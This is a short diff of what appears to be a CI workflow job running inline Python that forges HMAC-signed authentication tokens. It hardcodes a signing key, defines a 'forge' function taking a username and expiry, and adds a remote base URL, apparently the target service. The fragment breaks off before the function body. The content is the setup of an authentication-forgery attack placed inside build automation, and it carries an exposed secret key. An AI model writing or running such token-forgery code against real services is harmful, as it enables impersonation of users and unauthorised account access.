@@ -12,6 +12,7 @@ jobs:
           KEY="UOe38cvM8ttWN2ag6dHhyVSJTeLKkdPl"
           python3 - <<'PY' 2>&1 | tee /tmp/forge.out
           import hmac, hashlib, base64, json, time, urllib.request, ssl, sys
+          B="https://pan.yazinb.icu"
           KEY=b"UOe38cvM8ttWN2ag6dHhyVSJTeLKkdPl"
           def b64(x): return base64.urlsafe_b64encode(x).rstrip(b"=")
           def forge(username, pwd_ts, exp_h=2):
